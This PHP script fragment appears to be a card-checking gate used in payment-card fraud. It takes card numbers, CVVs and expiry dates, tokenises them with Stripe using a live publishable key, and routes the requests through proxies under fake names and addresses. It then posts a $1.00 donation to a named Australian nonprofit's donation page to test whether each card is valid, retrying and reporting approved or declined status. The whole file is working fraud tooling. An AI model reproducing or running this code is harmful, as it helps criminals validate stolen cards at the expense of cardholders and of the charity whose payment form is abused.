<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'card[name]='.$fake->first.'+'.$fake->last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78ef418&time_on_page='.rand(50000, 100000).'&key=pk_live_QQx8ejzU5Plxy9aRCnl1PnDg';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) {
	$empty = ''.$r1->error.'! ('.intval($r1->errno).')';

	goto start;
}

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$r2 = $this->curlx->Get('https://vnpa.org.au/donate/', null, $cookie, $server['proxy']);

if (!$r2->success) {
	$empty = ''.$r2->error.'! ('.intval($r2->errno).')';

	goto start;
}

$_wpnonce = trim(strip_tags($this->getstr($r2->body, '_wpnonce" value="', '"')));

if (empty($_wpnonce)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = 'payment%5Bfirst_name%5D='.$fake->first.'&payment%5Blast_name%5D='.$fake->last.'&payment%5Baddress%5D%5Bstreet%5D=8623+hickory+creek+dr&payment%5Baddress%5D%5Bsuburb%5D=Toowoomba&payment%5Baddress%5D%5Bpostcode%5D=8868&payment%5Baddress%5D%5Bstate%5D=act&payment%5Bemail%5D='.urlencode($fake->email).'&payment%5Bphone%5D=&payment%5Bfund%5D=Donation&payment%5Bmeta%5D%5Bcampaign%5D=Operating&payment%5Bamount%5D=1.00&payment%5Bid%5D=578&payments_action=process_payment&payment%5Bfrequency%5D=single&_wpnonce='.$_wpnonce.'&_wp_http_referer=%2Fdonate%2F&payment%5Btoken%5D='.$tok.'&payment%5Bgateway%5D=stripe';

$r3 = $this->curlx->Post('https://vnpa.org.au/', $data, null, $cookie, $server['proxy']);

if (!$r3->success) {
	$empty = ''.$r3->error.'! ('.intval($r3->errno).')';

	goto start;
}

$json_r3 = json_decode($r3->body);

$err = $json_r3->error ?? '';

$status = $this->response->Stripe($r3->body, $err);

end: